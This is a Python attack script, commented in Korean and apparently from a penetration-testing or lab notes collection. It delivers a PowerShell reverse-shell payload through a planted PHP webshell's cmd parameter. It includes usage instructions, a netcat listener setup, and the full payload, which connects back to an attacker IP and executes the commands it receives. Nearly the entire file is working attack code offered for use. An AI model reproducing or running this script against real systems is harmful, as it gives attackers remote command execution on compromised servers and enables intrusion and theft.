import sys

import requests

# cmd= GET 파라미터 웹셸에 PowerShell 리버스 셸 페이로드를 전송하는 스크립트.
#
# 사용법:
#   python3 send_powershell_reverse_shell_via_webshell.py <웹셸 URL> <공격자 IP> <리스너 포트>
# 예:
#   python3 send_powershell_reverse_shell_via_webshell.py \
#       http://10.10.20.5/blog/uploads/shell.php 10.10.10.10 443
#
# 사전 준비:
#   - 의존성: apt install python3-requests
#   - 공격자에서 리스너를 먼저 띄운다: rlwrap nc -lvnp <리스너 포트>
#
# 참고:
#   - 응답이 timeout 으로 떨어지는 것은 셸이 붙어 요청이 끝나지 않기 때문이다. 정상이다.
#   - PowerShell 페이로드 본문은 [windows_powershell_reverse_shell.md](../windows_powershell_reverse_shell.md) 참고.

if len(sys.argv) != 4:
    print(
        "사용법: python3 send_powershell_reverse_shell_via_webshell.py "
        "<웹셸 URL> <공격자 IP> <리스너 포트>"
    )
    sys.exit(1)

url, lhost, lport = sys.argv[1], sys.argv[2], sys.argv[3]

# PowerShell 리버스 셸 페이로드 (Revshells 원본)
powershell_payload = (
    '$LHOST = "' + lhost + '"; '
    "$LPORT = " + lport + "; "
    "$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); "
    "$NetworkStream = $TCPClient.GetStream(); "
    "$StreamReader = New-Object IO.StreamReader($NetworkStream); "
    "$StreamWriter = New-Object IO.StreamWriter($NetworkStream); "
    "$StreamWriter.AutoFlush = $true; "
    "$Buffer = New-Object System.Byte[] 1024; "
    "while ($TCPClient.Connected) { "
    "while ($NetworkStream.DataAvailable) { "
    "$RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); "
    "$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData - 1) "
    "}; "
    "if ($TCPClient.Connected -and $Code.Length -gt 1) { "
    "$Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; "
    '$StreamWriter.Write("$Output`n"); '
    "$Code = $null "
    "} "
    "}; "
    "$TCPClient.Close(); "
    "$NetworkStream.Close(); "
    "$StreamReader.Close(); "
    "$StreamWriter.Close()"
)

# 윈도우 셸(cmd)을 통해 파워셸이 실행되도록 조합
full_command = f'powershell -nop -c "{powershell_payload}"'

# URL 파라미터 전달
params = {"cmd": full_command}

print("[*] 공격자 리스너(rlwrap nc -lvnp <포트>)가 켜져 있는지 확인하세요.")
print("[*] 페이로드를 웹셸로 전송합니다...")

try:
    response = requests.get(url, params=params, timeout=3)
    print(f"[+] 요청 완료 (Status Code: {response.status_code})")
except requests.exceptions.Timeout:
    print(
        "[+] 리버스 쉘 루프 진입 (Timeout 발생은 정상입니다. Netcat 창을 확인하세요!)"
    )
except Exception as e:
    print(f"[-] 에러 발생: {e}")
